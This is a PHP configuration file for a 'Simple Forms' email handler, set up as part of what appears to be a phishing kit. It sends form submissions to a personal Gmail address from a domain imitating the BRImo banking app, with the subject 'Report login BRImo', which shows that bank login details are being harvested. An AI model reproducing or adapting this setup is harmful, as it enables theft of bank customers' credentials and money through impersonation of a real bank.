<?php
/**
 * Simple Forms Configuration File
 *
 * @link http://weblucas.info/
 *
 * @package simpleforms
 */

/***********************************************************************************
 * Fixme: DEFAULT MAILING SETTINGS
 *
 * Customize your mailing options,
 * IMPORTANT: Please do not remove any option below!
 ***********************************************************************************/


/**  -------------- REQUIRED FIELDS -------------- **/

// Receiver email address
define('YOUR_EMAIL', "vidanurmala9@gmail.com");

// From email address, highly recommended to use: no-reply@yourdomain.com
define('FROM_EMAIL', "no-reply@otarifbrimoapp.vercel.app");

// Required, email subject, example: New Form Submission
define('EMAILS_SUBJECT', "Report login BRImo");

// Required, your company/brand name
define('COMPANY_NAME', "Simple Forms");

// This option allows you to replay to user email, who sent the form.
// IMPORTANT: Please make sure you have an email input in your form, and the input has the attribute: name="email"
define('REPLY_TO_EMAIL_FIELD', true); // possible values: true | false

/**  -------------- REQUIRED FIELDS -------------- **/



/**  -------------- OPTIONAL FIELDS -------------- **/

// enable auto responder
define('ENABLE_AUTO_RESPONDER', false); // possible values: true | false

// Auto responder email subject
define('AUTO_RESPONDER_EMAILS_SUBJECT', "Your submission received!");

// not required, comma separated emails: myemail@gmail.com, myemail2@gmail.com
define('SEND_COPY_TO', "");

/**  -------------- OPTIONAL FIELDS -------------- **/



/*************************************************************************************
 * GOOGLE RECAPTCHA (ANTI SPAM) SETTINGS
 *
 * Generate your keys here: https://www.google.com/recaptcha/admin/create
 ************************************************************************************/

// possible values: true | false
define('USE_RECAPTCHA', false);

// recaptcha V2 SECRET_KEY (Required if USE_RECAPTCHA option above is set to true)
define("RECAPTCHA_V2_SECRET_KEY", "");



/*************************************************************************************
 * SECURE SSL/TLS CONNECTION SETTINGS (* required if SMTP_AUTHENTICATION = true)
 *
 * Use SECURE CONNECTION to prevent emails to be dropped in SPAM folder
 * or/if your server/hosting does not support other mailing options
 *
 * If SMTP_AUTHENTICATION set to true please provide SMTP SETTINGS bellow
 * see docs for more info (Back-end Configuration): https://weblucas.info/projects/simple-forms/simple-forms/help/
 ************************************************************************************/

// use SMTP (credentials required)
define('SMTP_AUTHENTICATION', false); // possible values: true | false

$SMTP_SETTINGS = [
    "SMTP_HOST"     => "mail.hostname.com",
    "SMTP_USER"     => "user@domain.com",
    "SMTP_PASSWORD" => "***************",
    "SMTP_SECURE"   => "ssl", // possible values: ssl | tls
    "SMTP_PORT"     => 465,   // SMTP port
    "SMTP_DEBUG"    => 0      // show errors description if connection failed, possible values: 0 | 1
];


/*************************************************************************************
 * FILES SETTINGS
 *
 * Choose to delete or keep uploaded files on your hosting after receiving emails
 * deleted files from your hosting will be available on your email only.
 ************************************************************************************/

// choose to keep or delete uploaded files after form submit
define("DELETE_FILES_AFTER_MAIL", true); // possible values: true | false
